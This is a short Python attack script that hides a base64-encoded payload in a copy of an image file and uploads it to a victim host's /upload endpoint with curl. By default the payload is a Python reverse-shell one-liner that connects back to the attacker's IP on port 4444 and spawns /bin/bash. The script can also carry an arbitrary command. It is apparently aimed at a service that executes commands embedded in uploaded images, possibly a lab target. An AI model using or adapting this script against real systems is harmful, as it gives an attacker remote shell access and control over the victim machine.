import base64, sys, subprocess

if (len(sys.argv) < 4):
    print("args format: [your ip] [victim ip] [http or https] [optional: command]")
    sys.exit(-1)

your_ip = sys.argv[1]
victim_ip = sys.argv[2]
mode = sys.argv[3]

# if command given, run that command
if (len(sys.argv) == 5):
    text = "START:" + sys.argv[4]
else: 
    # encode the ip
    text = f"""START:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{your_ip}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
encoded_bytes = base64.b64encode(text.encode("utf-8"))
encoded_str = encoded_bytes.decode("ascii")

# duplicate cat file
command = ["cp", "cat.jpg", "catbackup.jpg"]
subprocess.run(command)

# append command to cat file
with open("catbackup.jpg", "a") as f:
    subprocess.run(["echo", encoded_str], stdout=f, check=True)

if (mode == "https"):
    url = f"https://{victim_ip}/upload"
    command = ["curl", "-X", "POST", "--data-binary", "@catbackup.jpg", "-H", "Content-Type: image/jpeg", "-H", "filename: catbackup.jpg", "--cacert", "ca.crt", "--cert", "client.crt", "--key", "client.key", url]
# default to http
else: 
    url = f"http://{victim_ip}/upload"
    command = ["curl", "-X", "POST", "--data-binary", "@catbackup.jpg", "-H", "Content-Type: image/jpeg", "-H", "filename: catbackup.jpg", url]

result = subprocess.run(command, capture_output=True, text=True, check=True)
print(result.stdout)